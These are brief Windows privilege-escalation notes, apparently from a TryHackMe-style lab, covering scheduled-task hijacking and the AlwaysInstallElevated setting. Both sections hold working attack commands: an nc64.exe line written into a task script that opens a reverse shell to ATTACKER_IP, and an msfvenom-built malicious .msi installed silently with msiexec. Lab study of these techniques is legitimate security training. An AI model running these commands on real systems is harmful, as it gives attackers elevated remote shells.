**Scheduled Tasks**

```
C:\> schtasks
```

```
C:\> schtasks /query /tn SynchronizeTime /fo list /v
```

Important Info 
```
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

To check the file permissions on the executable

```
C:\> icacls c:\tasks\schtask.bat

full access (F) over the task's binary
modify permissions (M) on the service's executable
**(AD)** and **(WD)** privileges, allowing the user to create subdirectories and files, respectively.
```

Let's change the bat file to spawn a reverse shell:
```
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat

Set Listener
nc -lvp 4444

Run Scheduler
C:\> schtasks /run /tn vulntask
```

**AlwaysInstallElevated**

**This method requires two registry values to be set**. You can query these from the command line using the commands below.

Command Prompt

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

To be able to exploit this vulnerability, **both should be set**. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly.

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
